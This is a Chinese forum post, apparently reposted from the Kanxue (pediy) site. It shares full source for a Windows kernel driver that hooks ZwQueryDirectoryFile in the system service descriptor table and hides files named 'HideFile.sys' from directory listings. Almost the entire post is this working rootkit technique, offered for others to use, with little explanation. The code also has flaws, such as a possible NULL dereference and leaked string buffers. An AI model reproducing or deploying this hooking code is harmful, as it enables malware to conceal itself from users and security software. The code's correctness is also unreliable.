
# Hook `ZwQueryDirectoryFile` 实现文件隐藏

> 原文：[`www.pediy.com/kssd/pediy10/63629.html`](https://www.pediy.com/kssd/pediy10/63629.html)

学习了网上《编写驱动拦截 NT 的 API 实现隐藏文件目录》这篇文章，参考这篇文章的代码，自己试着写了下。现发出来我调试成功的代码，给需要的朋友们。

代码：

```
#include "ntddk.h"

typedef BOOLEAN BOOL;
typedef unsigned long DWORD;
typedef DWORD * PDWORD;
typedef unsigned long ULONG;
typedef unsigned short WORD;
typedef unsigned char BYTE;
// This is our unload function
#pragma pack(1)
typedef struct ServiceDescriptorEntry {
    unsigned int *ServiceTableBase;
    unsigned int *ServiceCounterTableBase;
    unsigned int NumberOfServices;
    unsigned char *ParamTableBase;
} ServiceDescriptorTableEntry_t, *PServiceDescriptorTableEntry_t;
#pragma pack()
__declspec(dllimport) ServiceDescriptorTableEntry_t KeServiceDescriptorTable;

typedef struct _FILE_BOTH_DIR_INFORMATION {
    ULONG           NextEntryOffset;
    ULONG           FileIndex;
    LARGE_INTEGER   CreationTime;
    LARGE_INTEGER   LastAccessTime;
    LARGE_INTEGER   LastWriteTime;
    LARGE_INTEGER   ChangeTime;
    LARGE_INTEGER   EndOfFile;
    LARGE_INTEGER   AllocationSize;
    ULONG           FileAttributes;
    ULONG           FileNameLength;
    ULONG           EaSize;
    CCHAR           ShortNameLength;
    WCHAR           ShortName[12];
    WCHAR           FileName[1];
} FILE_BOTH_DIR_INFORMATION, *PFILE_BOTH_DIR_INFORMATION;


// Our System Call Table
PVOID* NewSystemCallTable;

// Our Memory Descriptor List
PMDL pMyMDL;

#define HOOK_INDEX(function2hook) *(PULONG)((PUCHAR)function2hook+1)

#define HOOK(functionName, newPointer2Function, oldPointer2Function )  \
       oldPointer2Function = (PVOID) InterlockedExchange( (PLONG) &NewSystemCallTable[HOOK_INDEX(functionName)], (LONG) newPointer2Function)

#define UNHOOK(functionName, oldPointer2Function)  \
       InterlockedExchange( (PLONG) &NewSystemCallTable[HOOK_INDEX(functionName)], (LONG) oldPointer2Function)

NTSYSAPI
NTSTATUS
NTAPI ZwQueryDirectoryFile(
  IN  HANDLE FileHandle,
  IN  HANDLE Event OPTIONAL,
  IN  PIO_APC_ROUTINE ApcRoutine OPTIONAL,
  IN  PVOID ApcContext OPTIONAL,
  OUT PIO_STATUS_BLOCK IoStatusBlock,
  OUT PVOID FileInformation,
  IN  ULONG Length,
  IN  FILE_INFORMATION_CLASS FileInformationClass,
  IN  BOOLEAN ReturnSingleEntry,
  IN  PUNICODE_STRING FileName OPTIONAL,
  IN  BOOLEAN RestartScan
  );


typedef NTSTATUS (*ZWQUERYDIRECTORYFILE)(
            IN  HANDLE FileHandle,
  IN  HANDLE Event OPTIONAL,
  IN  PIO_APC_ROUTINE ApcRoutine OPTIONAL,
  IN  PVOID ApcContext OPTIONAL,
  OUT PIO_STATUS_BLOCK IoStatusBlock,
  OUT PVOID FileInformation,
  IN  ULONG Length,
  IN  FILE_INFORMATION_CLASS FileInformationClass,
  IN  BOOLEAN ReturnSingleEntry,
  IN  PUNICODE_STRING FileName OPTIONAL,
  IN  BOOLEAN RestartScan
  );

ZWQUERYDIRECTORYFILE        OldZwQueryDirectoryFile;

NTSTATUS NewZwQueryDirectoryFile(
                            IN  HANDLE FileHandle,
  IN  HANDLE Event OPTIONAL,
  IN  PIO_APC_ROUTINE ApcRoutine OPTIONAL,
  IN  PVOID ApcContext OPTIONAL,
  OUT PIO_STATUS_BLOCK IoStatusBlock,
  OUT PVOID FileInformation,
  IN  ULONG Length,
  IN  FILE_INFORMATION_CLASS FileInformationClass,
  IN  BOOLEAN ReturnSingleEntry,
  IN  PUNICODE_STRING FileName OPTIONAL,
  IN  BOOLEAN RestartScan
  )
{
  NTSTATUS status;
  ULONG CR0VALUE;
 
  ANSI_STRING ansiFileName,ansiDirName,HideDirFile;
  UNICODE_STRING uniFileName;
  RtlInitAnsiString(&HideDirFile,"HideFile.sys"); 
  DbgPrint("hide: NewZwQueryDirectoryFile called.");

  status = ((ZWQUERYDIRECTORYFILE)(OldZwQueryDirectoryFile)) (
                FileHandle,
                Event,
                ApcRoutine,
                ApcContext,
                IoStatusBlock,
                FileInformation,
                Length,
                FileInformationClass,
                ReturnSingleEntry,
                FileName,
                RestartScan);
  //这部分是隐藏文件的核心部分
    if(NT_SUCCESS(status)&&FileInformationClass==FileBothDirectoryInformation)
  {
    PFILE_BOTH_DIR_INFORMATION pFileInfo;
    PFILE_BOTH_DIR_INFORMATION pLastFileInfo;
    BOOLEAN bLastOne;
    pFileInfo = (PFILE_BOTH_DIR_INFORMATION)FileInformation; 
    pLastFileInfo = NULL;
    do
    {
      bLastOne = !( pFileInfo->NextEntryOffset );
      RtlInitUnicodeString(&uniFileName,pFileInfo->FileName);
      RtlUnicodeStringToAnsiString(&ansiFileName,&uniFileName,TRUE);
      RtlUnicodeStringToAnsiString(&ansiDirName,&uniFileName,TRUE);

      //DbgPrint("ansiFileName :%s\n",ansiFileName.Buffer);
      //DbgPrint("HideDirFile :%s\n",HideDirFile.Buffer);
      if( RtlCompareMemory(ansiFileName.Buffer,HideDirFile.Buffer,HideDirFile.Length ) == HideDirFile.Length)
      {
          if(bLastOne) 
          {
              pLastFileInfo->NextEntryOffset = 0;
            break;
          } 
          else //指针往后移动
          {
            int iPos = ((ULONG)pFileInfo) - (ULONG)FileInformation;
            int iLeft = (DWORD)Length - iPos - pFileInfo->NextEntryOffset;
            RtlCopyMemory( (PVOID)pFileInfo, (PVOID)( (char *)pFileInfo + pFileInfo->NextEntryOffset ), (DWORD)iLeft );
            continue;
          }
      }
      pLastFileInfo = pFileInfo;
      pFileInfo = (PFILE_BOTH_DIR_INFORMATION)((char *)pFileInfo + pFileInfo->NextEntryOffset);
    }while(!bLastOne);
    RtlFreeAnsiString(&ansiDirName); 
    RtlFreeAnsiString(&ansiFileName);
  }

  return status;
}

NTSTATUS Hook( )
{
  pMyMDL = MmCreateMdl(  NULL,
          KeServiceDescriptorTable.ServiceTableBase,
          KeServiceDescriptorTable.NumberOfServices * 4 );

  if( !pMyMDL )
    return( STATUS_UNSUCCESSFUL );

  MmBuildMdlForNonPagedPool( pMyMDL );
  pMyMDL->MdlFlags = pMyMDL->MdlFlags | MDL_MAPPED_TO_SYSTEM_VA;
  NewSystemCallTable = MmMapLockedPages( pMyMDL, KernelMode );

  if( !NewSystemCallTable )
    return( STATUS_UNSUCCESSFUL );
   
  // Add hooks here (remember to unhook if using DriverUnload)

  HOOK( ZwQueryDirectoryFile,NewZwQueryDirectoryFile ,OldZwQueryDirectoryFile);

  return( STATUS_SUCCESS );
}
NTSTATUS UnHook( )
{
  if( NewSystemCallTable )
  {
      UNHOOK( ZwQueryDirectoryFile, OldZwQueryDirectoryFile );
      MmUnmapLockedPages( NewSystemCallTable, pMyMDL );
      IoFreeMdl( pMyMDL );
  }
  return( STATUS_SUCCESS );
}

NTSTATUS OnUnload( IN PDRIVER_OBJECT DriverObject )

{
    NTSTATUS status;
    DbgPrint("OnUnload called\n");
    status=UnHook();
    return status;

}

NTSTATUS DriverEntry(IN PDRIVER_OBJECT theDriverObject,

                     IN PUNICODE_STRING theRegistryPath)

{
    NTSTATUS       status = STATUS_SUCCESS;

    DbgPrint("I loaded!");

      // Initialize the pointer to the unload function
    theDriverObject->DriverUnload  = OnUnload;
      // in the DriverObject
       
    //hook
    Hook();

    return STATUS_SUCCESS;

}
```
